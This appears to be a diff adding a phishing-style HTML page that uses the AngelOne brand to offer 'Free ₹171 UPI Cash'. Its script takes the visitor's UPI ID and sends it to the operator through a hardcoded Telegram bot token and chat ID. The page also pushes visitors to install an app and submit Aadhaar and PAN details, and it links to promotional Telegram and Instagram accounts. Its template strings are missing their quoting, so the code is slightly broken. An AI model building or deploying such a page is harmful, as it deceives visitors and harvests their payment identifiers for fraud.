@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Money Campaign </title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, #ff9966, #ff5e62);
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 400px;
+            margin: auto;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff5e62;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background: #6a0dad;
+            color: white;
+            padding: 10px;
+            border: none;
+            margin-top: 15px;
+            width: 100%;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .instructions {
+            text-align: left;
+            padding: 15px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .instructions b {
+            color: red;
+        }
+        .highlight {
+            font-weight: bold;
+            color: purple;
+        }
+        .social-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            width: 200px;
+            margin: 10px auto;
+            color: white;
+        }
+        .telegram-button {
+            background: #0088cc;
+        }
+        .instagram-button {
+            background: #E4405F;
+        }
+        .social-button img {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+        }
+    </style>
+    <script>
+        function submitForm(event) {
+            event.preventDefault();
+            let upiID = document.getElementById("upi").value.trim();
+
+            if (upiID !== "") {
+                sendToTelegram(upiID);
+                window.location.href = "redirect.html";
+            } else {
+                alert("Please enter a valid UPI ID.");
+            }
+        }
+
+        function sendToTelegram(upiID) {
+            let botToken = "7398067602:AAHXqpyula1O0rHd7RWNqolC2zdwGpSSaJ4";
+            let chatId = "6411315434";
+            let message = New UPI Submission:\nUPI ID: ${upiID};
+
+            let url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
+
+            fetch(url).then(response => console.log("Notification sent!"));
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Money Campaign</div>
+        <h2>AngelOne</h2>
+        <h3 style="color: red;">Free ₹171 UPI Cash</h3>
+        <form onsubmit="submitForm(event)">
+            <input type="text" id="upi" placeholder="Enter UPI ID" required>
+            <button type="submit">Submit</button>
+        </form>
+
+        <h3>How To Complete Offer?</h3>
+        <div class="instructions">
+            <p><b>1.</b> <span class="highlight">Enter your UPI ID</span> And Click <span class="highlight">Submit.</span></p>
+            <p><b>2.</b> <span class="highlight">Install App</span>, Register Using Basic Details. You Will Get <span class="highlight">Rs.1 UPI Cash</span> For Tracking.</p>
+            <p><b>3.</b> Open Account Using <span class="highlight">Aadhar and PAN Number</span> to complete the account. Wait For Approval.</p>
+            <p><b>Done!</b> You will get <span class="highlight">171 UPI Cash</span> instantly.</p>
+        </div>
+        <a href="https://t.me/khatriLooter" class="social-button telegram-button">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram"> Join Telegram
+        </a>
+
+        <a href="https://www.instagram.com/earn_with_nobita" class="social-button instagram-button">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram"> Instagram
+        </a>
+    </div>
+</body>
+</html>
